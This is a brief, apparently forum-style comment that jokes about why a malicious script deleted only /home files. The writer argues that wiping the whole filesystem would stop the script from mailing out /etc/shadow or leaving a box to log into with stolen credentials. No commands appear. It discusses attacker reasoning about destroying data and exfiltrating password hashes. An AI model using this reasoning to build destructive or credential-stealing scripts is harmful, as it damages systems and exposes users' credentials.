perhaps it was *designed* to only delete files from /home = because
if you did a full recursive nasty delete of the whole filesystem
then , not only would there not be a /etc/shadow to mail out, but
also the mail command would not work - and if, by miracle, the command
did work then the mail wouldnt go anywhere because the mailspool dir would
not exist etc....and if, by some crazy broken-system way anything ever
did get off the box, then there wouldnt actually be a box worth logging
into remotely using any credentials that might be in /etc/shadow anyway ;-)
